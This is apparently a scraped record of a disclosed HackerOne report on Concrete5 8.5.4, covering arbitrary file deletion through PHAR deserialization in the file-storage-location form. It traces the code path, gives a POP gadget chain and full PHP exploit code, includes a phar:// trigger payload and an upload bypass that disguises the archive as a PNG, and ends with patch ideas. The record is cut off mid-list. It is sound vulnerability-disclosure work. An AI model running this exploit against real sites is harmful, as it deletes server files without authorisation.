{
  "reported_to": "Concrete CMS",
  "reported_by": "reset ",
  "title": "Arbitrary File delete via PHAR deserialization",
  "content": "\ncrayons :)\nConcrete5 Arbitrary File delete via PHAR deserialization\nTarget: Concrete5\nVersion: 8.5.4 (Latest at 2020. 07. 12) / PHP 7.2\nCredit: WSP Lab@KAIST\nContact: reset@kaist.ac.kr\nTL; DR\nAn attacker can send an arbitrary input value in the is_dir() function, which causes a PHAR deserialization bug. By using this bug, the attacker possible to exploit that deletes arbitrary files.\nBackground\nPHP Object Injection (PHP deserialization): When an attacker controls a serialized object that is passed into unserialize(), she can control the properties of the created object. This will then allow her the opportunity to hijack the flow of the application, by controlling the values passed into magic methods like __wakeup() [1].\nPHAR deserialization: The attack surface of the PHP deserialization vulnerability has been extended. With the parameter of filesystem function (file_exists(), is_dir(), etc.) under control, this method can be used with phar:// pseudo-protocol to directly perform deserialization without relying on unserialize()[2].\nBug analyzing\nEndpoint\nNavigation: Dashboard => System&Settings => File Storage Location => Add Location\n<image_0>\nBug flow\nWhen attackers add optional file storage locations at the endpoint, the server executes validateStorageRequest() method to validate the location path code, which is (a).\nCode 1021 Bytes\n1- File: concrete/controllers/single_page/dashboard/system/files/storage.php\n2- Line: 131 ~ 148\n3    \n4    public function add()\n5    {\n6        $type = $this->validateStorageRequest(); // ................................................... (a)\n7        if (!$this->token->validate('add')) {\n8            $this->error->add($this->token->getErrorMessage());\n9        }\n10        if (!$this->error->has()) {\n11            $configuration = $type->getConfigurationObject();\n12            $configuration->loadFromRequest($this->request);\n13            $factory = $this->app->make(StorageLocationFactory::class);\n14            /* @var StorageLocationFactory $factory */\n15            $location = $factory->create($configuration, $this->request->request->get('fslName'));\n16            $location->setIsDefault($this->request->request->get('fslIsDefault'));\n17            $location = $factory->persist($location);\n18            $this->redirect('/dashboard/system/files/storage', 'storage_location_added');\n19        }\n20        $this->set('type', $type);\n21    }\nNext, the request that the attacker sent will be transported to validateRequest() as a parameter - (b).\nCode 782 Bytes\n1- File: concrete/controllers/single_page/dashboard/system/files/storage.php\n2- Line: 64 ~ 81\n3    \n4    protected function validateStorageRequest()\n5    {\n6        $val = $this->app->make('helper/validation/strings');\n7        $type = Type::getByID($this->request->get('fslTypeID'));\n8        if ($type === null) {\n9            $this->error->add(t('Invalid type object.'));\n10        } else {\n11            $e = $type->getConfigurationObject()->validateRequest($this->request); // ................... (b)\n12            if (is_object($e)) {\n13                $this->error->add($e);\n14            }\n15        }\n16        if (!$val->notempty($this->request->request->get('fslName'))) {\n17            $this->error->add(t('Your file storage location must have a name.'));\n18        }\n19 \n20        return $type;\n21    }\nFinally, is_dir function will be executed by user input without any sanitization.\nCode 1.39 KiB\n1- File: concrete/src/File/StorageLocation/Configuration/LocalConfiguration.php\n2- Line: 75 ~ 102\n3    \n4    public function validateRequest(\\Concrete\\Core\\Http\\Request $req)\n5    {\n6        $app = Application::getFacadeApplication();\n7        $e = $app->make('error');\n8        $data = $req->get('fslType');\n9        $fslID = $req->get('fslID');\n10        $locationHasFiles = false;\n11        $locationRootPath = null;\n12        if (!empty($fslID)) {\n13            $location = $app->make(StorageLocationFactory::class)->fetchByID($fslID);\n14            if (is_object($location)) {\n15                $locationHasFiles = $location->hasFiles();\n16                $locationRootPath = $location->getConfigurationObject()->getRootPath();\n17            }\n18        }\n19        $this->path = $data['path'];\n20        if (!$this->path) {\n21            $e->add(t(\"You must include a root path for this storage location.\"));\n22        } elseif (!is_dir($this->path)) { // ......................................................... (c)\n23            $e->add(t(\"The specified root path does not exist.\"));\n24        } elseif ($this->path == '/') {\n25            $e->add(t('Invalid path to file storage location. You may not choose the root directory.'));\n26        } elseif ($locationHasFiles && $locationRootPath !== $this->path) {\n27            $e->add(t('You can not change the root path of this storage location because it contains files.'));\n28        }\n29\n30        return $e;\n31    }\n32\nIn other words, an attacker can send an arbitrary path, which is executed with the parameter of is_dir(). Even if the path has \"phar://\" schema.\nExploit\nTo exploit this bug, I will use POP (Property Oriented Programming) technique [3].\nTo chain gadgets, I found 3 nice gadgets to delete some files.\nGadgets\nGadget #1. VolatileDirectory::__destruct()\nIt will naturally execute below codes when PHP terminated. Because, __destruct is magic method that invoked when class destructed.\nIt will naturally execute below codes when PHP terminated. Because, __destruct is magic method that invoked when class destructed.\nCode 396 Bytes\n1// File: concrete/src/File/Service/VolatileDirectory.php\n2// Class: VolatileDirectory\n3// Line: 75 ~ 84\n4    \n5    public function __destruct()\n6    {\n7        if ($this->path !== null) {\n8            try {\n9                $this->filesystem->deleteDirectory($this->path); // ....................... (d)\n10            } catch (Exception $foo) {\n11            }\n12            $this->path = null;\n13        }\n14    }\nGadget #2. Filesystem::deleteDirectory()\nCode 1.21 KiB\n1// File: concrete/vendor/illuminate/filesystem/Filesystem.php\n2// Class: Filesystem\n3// Line: 473 ~ 502\n4\n5     public function deleteDirectory($directory, $preserve = false)\n6     {\n7         if (! $this->isDirectory($directory)) {\n8             return false;\n9         }\n10 \n11         $items = new FilesystemIterator($directory);\n12 \n13         foreach ($items as $item) {\n14             // If the item is a directory, we can just recurse into the function and\n15             // delete that sub-directory otherwise we'll just delete the file and\n16             // keep iterating through each file until the directory is cleaned.\n17             if ($item->isDir() && ! $item->isLink()) {\n18                 $this->deleteDirectory($item->getPathname());\n19             }\n20 \n21             // If the item is just a file, we can go ahead and delete it since we're\n22             // just looping through and waxing all of the files in this directory\n23             // and calling directories recursively, so we delete the real path.\n24             else {\n25                 $this->delete($item->getPathname()); // ............................ (e)\n26             }\n27         }\n28 \n29         if (! $preserve) {\n30             @rmdir($directory);\n31         }\n32 \n33         return true;\n34     }\nGadget #3. Filesystem::delete()\nCode 580 Bytes\n1// File: concrete/vendor/illuminate/filesystem/Filesystem.php\n2// Class: Filesystem\n3// Line: 148 ~ 165\n4\n5     public function delete($paths)\n6     {\n7         $paths = is_array($paths) ? $paths : func_get_args();\n8 \n9         $success = true;\n10 \n11         foreach ($paths as $path) {\n12             try {\n13                 if (! @unlink($path)) { // ........................................ (f)\n14                     $success = false;\n15                 }\n16             } catch (ErrorException $e) {\n17                 $success = false;\n18             }\n19         }\n20 \n21         return $success;\n22     }\nExploit code\nStage #1. Make PHAR file to exploit.\nCode 1.18 KiB\n1// Input: None\n2// Output: concrete5_exploit.png\n3\n4<?php\n5// Gadgets\n6namespace Illuminate\\Filesystem{\n7  class Filesystem{}\n8}\n9namespace Concrete\\Core\\File\\Service{ \n10  class VolatileDirectory{\n11    protected $filesystem;\n12    protected $path;\n13    function __construct(){\n14      $this->filesystem = new \\Illuminate\\Filesystem\\Filesystem;\n15      $this->path = \"/var/www/html/phar_exploit/test_dir\";\n16      // Directory that including some files. (Attacker can set any path.)\n17    }\n18  }\n19}\n20\n21// Generate phar file to exploit\n22namespace{\n23  $output_path = __DIR__;\n24  $exploit_file = $output_path . \"/concrete5_exploit.phar\";\n25  $phar = new Phar($exploit_file);\n26  $phar->startBuffering();\n27  $phar->setStub(\"<?php __HALT_COMPILER();\");\n28  \n29  $payload = new \\Concrete\\Core\\File\\Service\\VolatileDirectory;\n30  $phar->setMetadata($payload);\n31  \n32  $phar->addFromString(\"dummy.txt\", \"DUMMY\");\n33  $phar->stopBuffering();\n34\n35  // Change file extension PHAR to PNG. (for bypassing file upload restrictions)\n36  $changing_file_name = \"concrete5_exploit.png\";\n37  $changing_internal_full_path = $output_path . \"/\" . $changing_file_name;\n38  rename($exploit_file, $changing_file_name);\n39}\n40\n41\n42// Run below command to make PHAR file.\n43// php generate_exploit.php\nStage #2. Upload PHAR file.\nFortunately, concrete5 supports file upload featue.\nNavigation: Dashboard => Files => File Manager => Upload Files\nNavigation: Dashboard => Files => File Manager => Upload Files\n<image_1>\n<image_2>\nStage #3. Triggering PHAR deserialization bug.\nNavigation: Dashboard => System&Settings => File Storage Location => Add Location\nPayload: phar://./application/files/6815/9449/9442/concrete5_exploit.png\n<image_3>\nExploit Before / After\nBefore (Directory: /var/www/html/phar_exploit/test_dir)\n<image_4>\nAfter (Directory)\n<image_5>\ntest1/2/3.txt were deleted by exploit.\nPatch\n<?php\n// input_path is phar://path/to/file\nif(strpos($input_path, \"phar://\") !== FALSE){\n    trigger_error(\"Detected phar wrapper!\", E_USER_ERROR); // phar detected.\n}\nelse{\n    is_dir($input_path);\n}\n?>\n<?php\n// input_path is phar://path/to/file\nif(strpos($input_path, \"phar://\") !== FALSE){\n    trigger_error(\"Detected phar wrapper!\", E_USER_ERROR); // phar detected.\n}\nelse{\n    is_dir($input_path);\n}\n?>\n<?php\n// input_path is phar://path/to/file\n$sanitized_path = \"/\" . $input_path;\n// sanitized_path is /phar://path/to/file\n// Therefore, PHP wouldn't recognize that file is phar wrapped file.\nis_dir($sanitized_path);\n?>\nReference\n[1] https://blog.usejournal.com/diving-into-unserialize-phar-deserialization-98b1254380e9\n[2] https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066\n[3] Stefan Esser, Utilizing Code Reuse/Return Oriented Programming in PHP Web Application Exploits, Blackhat USA 2010\nImpact\nAttacker could delete any files on the server.\nThis report is just one example of using this bug.\nIn other words, if an attacker using other gadgets to exploit (POP technique) this bug, It will potentially generate various exploits including XSS and SQL injection, remote code execution, and so on.\n\n",
  "severity": [
    7.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UFiYFyxsxs1sU9P3x4XV3ie6?response-content-disposition=attachment%3B%20filename%3D%22image-20200712042659225.png%22%3B%20filename%2A%3DUTF-8%27%27image-20200712042659225.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCCRTJWQ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T172741Z&X-Amz-Expires=2558&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF3Us%2FimESWsysen9Ra%2FZ6r1b3OeQm4bLqxTiKAz%2F5rzAiAczyHgp6ty1Maxpe7nmX0DSL8Tte3Fxypcz%2BcgLTAeVyqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMGVqnhEQSgUgDGCkuKo8FHCIPPFmFvFawAa6TEe6wo7GjgEMVhjsBzdfiHlOBPBQe3l%2B05w%2BYdZJyT0Se5A4hspTCyLMxgtY5D4Q%2Bloxa%2BgruisedjtjnfkF3XkIYjMCqAyFsXiavGSCiaO3bqrpVmJsbp7AkBtu6td26Uynd7jxxj6F9FtsN1IXFJAHJTPHtNNanrFjnsyM3M271u4R315Qbhv6l31h3YfdYQBj3bKHPZjGlPqKCV0WLMDCLBp1GMtO3zVOno6CAloAoXmSiKclitoWQEYaomRiS5DeNreY5%2Fj9MzhWz1QbpPNKjjFOtedPPBXxEhykui4HSoVVJvJXyzyBtxD3QuReImQ%2FAU71u2ulXAwUCz34JgcJyTDP33ZZY1yBAj4H6cg%2B27rAPa7JIFmIa1xz59pfWc%2Foh39OUFN6H6hKytFJEQ2gwjQeMiQS6qKcmZSZHyWTKXCzdONusYCr4LbDQ4dt%2FusmjeSgu8DQk7jPy78JpPmWS44eJXI%2BeVezCGbfz2vlk%2F2iqgGNdsZp%2FIUpkq7qw%2FjkSYTLskxYpi4jpcECHiO1lDSy19kxENtSm2TDq3gyLWE5%2FpZit4zaazjbSikV7MCtquRS0xZBkwNyQwmoQRU6a6gZRjvTb73fVA1L%2FJUDzaXeApxSh%2BBTUKeT7N7HX%2FynoWChVpNjEaeIClJfBo8YYCaaNMyNtvH0NbFmXneoosivXbYLXPdMxpbAl%2Bo%2FL8EVHyRvIvdZb%2F02J4etN4TSZrny%2BQCs5LUBJd39DD%2FifwDNG%2BGi%2BJS9tlctWe7cLtSq8s%2FY39s8PLQhKrDQmcGLfXegrUuy788O5NxCM0n1hpigo6MVcBwoRtaypUdxJv5H3wdUQ17mx2KmR2%2BAOuGG8DTDOs4q%2FBjqyAdK4pe%2B9y3u3LagENYaO8cr5PWW5ErF0g2AULTtsUojqZgwUIGMYwcy7Q5gPDPck5XlpRWMcvLUegiBiySmqNRpfa1BQExsXLtQuKeKLdgDfn8%2Fztr4N8Jl1I2BBUrnvBU43oDq9FXKQ%2F56UB6iwNOUMLo15GrEnM8b5NVE0NqtKYRV5Im3GFfyE6sAluIjvxkGIJrZ5DbYTva9ipaUVdHXqVR32reQOJPQ0du3SpuDJlLI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=abdc710fdbd0eed7202b954e24a660646429275eb988476457cbe5eb07eed029",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HEhAzkAgJyhoX16uoj19YEXF?response-content-disposition=attachment%3B%20filename%3D%22image-20200712054249847.png%22%3B%20filename%2A%3DUTF-8%27%27image-20200712054249847.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCCRTJWQ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T172741Z&X-Amz-Expires=2558&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF3Us%2FimESWsysen9Ra%2FZ6r1b3OeQm4bLqxTiKAz%2F5rzAiAczyHgp6ty1Maxpe7nmX0DSL8Tte3Fxypcz%2BcgLTAeVyqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMGVqnhEQSgUgDGCkuKo8FHCIPPFmFvFawAa6TEe6wo7GjgEMVhjsBzdfiHlOBPBQe3l%2B05w%2BYdZJyT0Se5A4hspTCyLMxgtY5D4Q%2Bloxa%2BgruisedjtjnfkF3XkIYjMCqAyFsXiavGSCiaO3bqrpVmJsbp7AkBtu6td26Uynd7jxxj6F9FtsN1IXFJAHJTPHtNNanrFjnsyM3M271u4R315Qbhv6l31h3YfdYQBj3bKHPZjGlPqKCV0WLMDCLBp1GMtO3zVOno6CAloAoXmSiKclitoWQEYaomRiS5DeNreY5%2Fj9MzhWz1QbpPNKjjFOtedPPBXxEhykui4HSoVVJvJXyzyBtxD3QuReImQ%2FAU71u2ulXAwUCz34JgcJyTDP33ZZY1yBAj4H6cg%2B27rAPa7JIFmIa1xz59pfWc%2Foh39OUFN6H6hKytFJEQ2gwjQeMiQS6qKcmZSZHyWTKXCzdONusYCr4LbDQ4dt%2FusmjeSgu8DQk7jPy78JpPmWS44eJXI%2BeVezCGbfz2vlk%2F2iqgGNdsZp%2FIUpkq7qw%2FjkSYTLskxYpi4jpcECHiO1lDSy19kxENtSm2TDq3gyLWE5%2FpZit4zaazjbSikV7MCtquRS0xZBkwNyQwmoQRU6a6gZRjvTb73fVA1L%2FJUDzaXeApxSh%2BBTUKeT7N7HX%2FynoWChVpNjEaeIClJfBo8YYCaaNMyNtvH0NbFmXneoosivXbYLXPdMxpbAl%2Bo%2FL8EVHyRvIvdZb%2F02J4etN4TSZrny%2BQCs5LUBJd39DD%2FifwDNG%2BGi%2BJS9tlctWe7cLtSq8s%2FY39s8PLQhKrDQmcGLfXegrUuy788O5NxCM0n1hpigo6MVcBwoRtaypUdxJv5H3wdUQ17mx2KmR2%2BAOuGG8DTDOs4q%2FBjqyAdK4pe%2B9y3u3LagENYaO8cr5PWW5ErF0g2AULTtsUojqZgwUIGMYwcy7Q5gPDPck5XlpRWMcvLUegiBiySmqNRpfa1BQExsXLtQuKeKLdgDfn8%2Fztr4N8Jl1I2BBUrnvBU43oDq9FXKQ%2F56UB6iwNOUMLo15GrEnM8b5NVE0NqtKYRV5Im3GFfyE6sAluIjvxkGIJrZ5DbYTva9ipaUVdHXqVR32reQOJPQ0du3SpuDJlLI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=254396a786b1cfe4046aca5a0b9489dfcdac7980e5e74ba94f7825b67f6896e5",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XNTmCjVMxza7aKYumxKsyURX?response-content-disposition=attachment%3B%20filename%3D%22image-20200712062149547.png%22%3B%20filename%2A%3DUTF-8%27%27image-20200712062149547.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCCRTJWQ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T172741Z&X-Amz-Expires=2558&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF3Us%2FimESWsysen9Ra%2FZ6r1b3OeQm4bLqxTiKAz%2F5rzAiAczyHgp6ty1Maxpe7nmX0DSL8Tte3Fxypcz%2BcgLTAeVyqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMGVqnhEQSgUgDGCkuKo8FHCIPPFmFvFawAa6TEe6wo7GjgEMVhjsBzdfiHlOBPBQe3l%2B05w%2BYdZJyT0Se5A4hspTCyLMxgtY5D4Q%2Bloxa%2BgruisedjtjnfkF3XkIYjMCqAyFsXiavGSCiaO3bqrpVmJsbp7AkBtu6td26Uynd7jxxj6F9FtsN1IXFJAHJTPHtNNanrFjnsyM3M271u4R315Qbhv6l31h3YfdYQBj3bKHPZjGlPqKCV0WLMDCLBp1GMtO3zVOno6CAloAoXmSiKclitoWQEYaomRiS5DeNreY5%2Fj9MzhWz1QbpPNKjjFOtedPPBXxEhykui4HSoVVJvJXyzyBtxD3QuReImQ%2FAU71u2ulXAwUCz34JgcJyTDP33ZZY1yBAj4H6cg%2B27rAPa7JIFmIa1xz59pfWc%2Foh39OUFN6H6hKytFJEQ2gwjQeMiQS6qKcmZSZHyWTKXCzdONusYCr4LbDQ4dt%2FusmjeSgu8DQk7jPy78JpPmWS44eJXI%2BeVezCGbfz2vlk%2F2iqgGNdsZp%2FIUpkq7qw%2FjkSYTLskxYpi4jpcECHiO1lDSy19kxENtSm2TDq3gyLWE5%2FpZit4zaazjbSikV7MCtquRS0xZBkwNyQwmoQRU6a6gZRjvTb73fVA1L%2FJUDzaXeApxSh%2BBTUKeT7N7HX%2FynoWChVpNjEaeIClJfBo8YYCaaNMyNtvH0NbFmXneoosivXbYLXPdMxpbAl%2Bo%2FL8EVHyRvIvdZb%2F02J4etN4TSZrny%2BQCs5LUBJd39DD%2FifwDNG%2BGi%2BJS9tlctWe7cLtSq8s%2FY39s8PLQhKrDQmcGLfXegrUuy788O5NxCM0n1hpigo6MVcBwoRtaypUdxJv5H3wdUQ17mx2KmR2%2BAOuGG8DTDOs4q%2FBjqyAdK4pe%2B9y3u3LagENYaO8cr5PWW5ErF0g2AULTtsUojqZgwUIGMYwcy7Q5gPDPck5XlpRWMcvLUegiBiySmqNRpfa1BQExsXLtQuKeKLdgDfn8%2Fztr4N8Jl1I2BBUrnvBU43oDq9FXKQ%2F56UB6iwNOUMLo15GrEnM8b5NVE0NqtKYRV5Im3GFfyE6sAluIjvxkGIJrZ5DbYTva9ipaUVdHXqVR32reQOJPQ0du3SpuDJlLI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fc39e30d67244196b91c36ac226c68b83cc25401cb6347f000776de9cf74c291",
    "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aCok2YWomkxmfg5a5cppVitq?response-content-disposition=attachment%3B%20filename%3D%22image-20200712055052386.png%22%3B%20filename%2A%3DUTF-8%27%27image-20200712055052386.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCCRTJWQ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T172741Z&X-Amz-Expires=2558&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF3Us%2FimESWsysen9Ra%2FZ6r1b3OeQm4bLqxTiKAz%2F5rzAiAczyHgp6ty1Maxpe7nmX0DSL8Tte3Fxypcz%2BcgLTAeVyqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMGVqnhEQSgUgDGCkuKo8FHCIPPFmFvFawAa6TEe6wo7GjgEMVhjsBzdfiHlOBPBQe3l%2B05w%2BYdZJyT0Se5A4hspTCyLMxgtY5D4Q%2Bloxa%2BgruisedjtjnfkF3XkIYjMCqAyFsXiavGSCiaO3bqrpVmJsbp7AkBtu6td26Uynd7jxxj6F9FtsN1IXFJAHJTPHtNNanrFjnsyM3M271u4R315Qbhv6l31h3YfdYQBj3bKHPZjGlPqKCV0WLMDCLBp1GMtO3zVOno6CAloAoXmSiKclitoWQEYaomRiS5DeNreY5%2Fj9MzhWz1QbpPNKjjFOtedPPBXxEhykui4HSoVVJvJXyzyBtxD3QuReImQ%2FAU71u2ulXAwUCz34JgcJyTDP33ZZY1yBAj4H6cg%2B27rAPa7JIFmIa1xz59pfWc%2Foh39OUFN6H6hKytFJEQ2gwjQeMiQS6qKcmZSZHyWTKXCzdONusYCr4LbDQ4dt%2FusmjeSgu8DQk7jPy78JpPmWS44eJXI%2BeVezCGbfz2vlk%2F2iqgGNdsZp%2FIUpkq7qw%2FjkSYTLskxYpi4jpcECHiO1lDSy19kxENtSm2TDq3gyLWE5%2FpZit4zaazjbSikV7MCtquRS0xZBkwNyQwmoQRU6a6gZRjvTb73fVA1L%2FJUDzaXeApxSh%2BBTUKeT7N7HX%2FynoWChVpNjEaeIClJfBo8YYCaaNMyNtvH0NbFmXneoosivXbYLXPdMxpbAl%2Bo%2FL8EVHyRvIvdZb%2F02J4etN4TSZrny%2BQCs5LUBJd39DD%2FifwDNG%2BGi%2BJS9tlctWe7cLtSq8s%2FY39s8PLQhKrDQmcGLfXegrUuy788O5NxCM0n1hpigo6MVcBwoRtaypUdxJv5H3wdUQ17mx2KmR2%2BAOuGG8DTDOs4q%2FBjqyAdK4pe%2B9y3u3LagENYaO8cr5PWW5ErF0g2AULTtsUojqZgwUIGMYwcy7Q5gPDPck5XlpRWMcvLUegiBiySmqNRpfa1BQExsXLtQuKeKLdgDfn8%2Fztr4N8Jl1I2BBUrnvBU43oDq9FXKQ%2F56UB6iwNOUMLo15GrEnM8b5NVE0NqtKYRV5Im3GFfyE6sAluIjvxkGIJrZ5DbYTva9ipaUVdHXqVR32reQOJPQ0du3SpuDJlLI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=61267fbc73afbf10709b609c3c4f900b90f5743a8ed2107d21720db9158d7762",
    "image_4": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yuqf5E3puMD9AcoK1RfBha9F?response-content-disposition=attachment%3B%20filename%3D%22image-20200712055237892.png%22%3B%20filename%2A%3DUTF-8%27%27image-20200712055237892.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCCRTJWQ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T172741Z&X-Amz-Expires=2558&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF3Us%2FimESWsysen9Ra%2FZ6r1b3OeQm4bLqxTiKAz%2F5rzAiAczyHgp6ty1Maxpe7nmX0DSL8Tte3Fxypcz%2BcgLTAeVyqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMGVqnhEQSgUgDGCkuKo8FHCIPPFmFvFawAa6TEe6wo7GjgEMVhjsBzdfiHlOBPBQe3l%2B05w%2BYdZJyT0Se5A4hspTCyLMxgtY5D4Q%2Bloxa%2BgruisedjtjnfkF3XkIYjMCqAyFsXiavGSCiaO3bqrpVmJsbp7AkBtu6td26Uynd7jxxj6F9FtsN1IXFJAHJTPHtNNanrFjnsyM3M271u4R315Qbhv6l31h3YfdYQBj3bKHPZjGlPqKCV0WLMDCLBp1GMtO3zVOno6CAloAoXmSiKclitoWQEYaomRiS5DeNreY5%2Fj9MzhWz1QbpPNKjjFOtedPPBXxEhykui4HSoVVJvJXyzyBtxD3QuReImQ%2FAU71u2ulXAwUCz34JgcJyTDP33ZZY1yBAj4H6cg%2B27rAPa7JIFmIa1xz59pfWc%2Foh39OUFN6H6hKytFJEQ2gwjQeMiQS6qKcmZSZHyWTKXCzdONusYCr4LbDQ4dt%2FusmjeSgu8DQk7jPy78JpPmWS44eJXI%2BeVezCGbfz2vlk%2F2iqgGNdsZp%2FIUpkq7qw%2FjkSYTLskxYpi4jpcECHiO1lDSy19kxENtSm2TDq3gyLWE5%2FpZit4zaazjbSikV7MCtquRS0xZBkwNyQwmoQRU6a6gZRjvTb73fVA1L%2FJUDzaXeApxSh%2BBTUKeT7N7HX%2FynoWChVpNjEaeIClJfBo8YYCaaNMyNtvH0NbFmXneoosivXbYLXPdMxpbAl%2Bo%2FL8EVHyRvIvdZb%2F02J4etN4TSZrny%2BQCs5LUBJd39DD%2FifwDNG%2BGi%2BJS9tlctWe7cLtSq8s%2FY39s8PLQhKrDQmcGLfXegrUuy788O5NxCM0n1hpigo6MVcBwoRtaypUdxJv5H3wdUQ17mx2KmR2%2BAOuGG8DTDOs4q%2FBjqyAdK4pe%2B9y3u3LagENYaO8cr5PWW5ErF0g2AULTtsUojqZgwUIGMYwcy7Q5gPDPck5XlpRWMcvLUegiBiySmqNRpfa1BQExsXLtQuKeKLdgDfn8%2Fztr4N8Jl1I2BBUrnvBU43oDq9FXKQ%2F56UB6iwNOUMLo15GrEnM8b5NVE0NqtKYRV5Im3GFfyE6sAluIjvxkGIJrZ5DbYTva9ipaUVdHXqVR32reQOJPQ0du3SpuDJlLI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3253f761cf2eabd40860c28c4e5b7365fa17602f95e3bfd230a2f5a38e1e69dd",
    "image_5": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Q9oRaPC6DRLVM2bWmdk8pFKi?response-content-disposition=attachment%3B%20filename%3D%22image-20200712055306938.png%22%3B%20filename%2A%3DUTF-8%27%27image-20200712055306938.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCCRTJWQ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T172741Z&X-Amz-Expires=2558&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIF3Us%2FimESWsysen9Ra%2FZ6r1b3OeQm4bLqxTiKAz%2F5rzAiAczyHgp6ty1Maxpe7nmX0DSL8Tte3Fxypcz%2BcgLTAeVyqyBQgVEAMaDDAxMzYxOTI3NDg0OSIMGVqnhEQSgUgDGCkuKo8FHCIPPFmFvFawAa6TEe6wo7GjgEMVhjsBzdfiHlOBPBQe3l%2B05w%2BYdZJyT0Se5A4hspTCyLMxgtY5D4Q%2Bloxa%2BgruisedjtjnfkF3XkIYjMCqAyFsXiavGSCiaO3bqrpVmJsbp7AkBtu6td26Uynd7jxxj6F9FtsN1IXFJAHJTPHtNNanrFjnsyM3M271u4R315Qbhv6l31h3YfdYQBj3bKHPZjGlPqKCV0WLMDCLBp1GMtO3zVOno6CAloAoXmSiKclitoWQEYaomRiS5DeNreY5%2Fj9MzhWz1QbpPNKjjFOtedPPBXxEhykui4HSoVVJvJXyzyBtxD3QuReImQ%2FAU71u2ulXAwUCz34JgcJyTDP33ZZY1yBAj4H6cg%2B27rAPa7JIFmIa1xz59pfWc%2Foh39OUFN6H6hKytFJEQ2gwjQeMiQS6qKcmZSZHyWTKXCzdONusYCr4LbDQ4dt%2FusmjeSgu8DQk7jPy78JpPmWS44eJXI%2BeVezCGbfz2vlk%2F2iqgGNdsZp%2FIUpkq7qw%2FjkSYTLskxYpi4jpcECHiO1lDSy19kxENtSm2TDq3gyLWE5%2FpZit4zaazjbSikV7MCtquRS0xZBkwNyQwmoQRU6a6gZRjvTb73fVA1L%2FJUDzaXeApxSh%2BBTUKeT7N7HX%2FynoWChVpNjEaeIClJfBo8YYCaaNMyNtvH0NbFmXneoosivXbYLXPdMxpbAl%2Bo%2FL8EVHyRvIvdZb%2F02J4etN4TSZrny%2BQCs5LUBJd39DD%2FifwDNG%2BGi%2BJS9tlctWe7cLtSq8s%2FY39s8PLQhKrDQmcGLfXegrUuy788O5NxCM0n1hpigo6MVcBwoRtaypUdxJv5H3wdUQ17mx2KmR2%2BAOuGG8DTDOs4q%2FBjqyAdK4pe%2B9y3u3LagENYaO8cr5PWW5ErF0g2AULTtsUojqZgwUIGMYwcy7Q5gPDPck5XlpRWMcvLUegiBiySmqNRpfa1BQExsXLtQuKeKLdgDfn8%2Fztr4N8Jl1I2BBUrnvBU43oDq9FXKQ%2F56UB6iwNOUMLo15GrEnM8b5NVE0NqtKYRV5Im3GFfyE6sAluIjvxkGIJrZ5DbYTva9ipaUVdHXqVR32reQOJPQ0du3SpuDJlLI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b7339b33d8b01496b8fc30a477232c874fea590cb4dc2e68ca5d53f5fd5a6e64"
  },
  "disclosed_date": 1634761440,
  "report_url": "https://hackerone.com/reports/921288",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Generate a PHAR file containing a serialized payload using the VolatileDirectory class with a target directory path."
    ],
    [
      2,
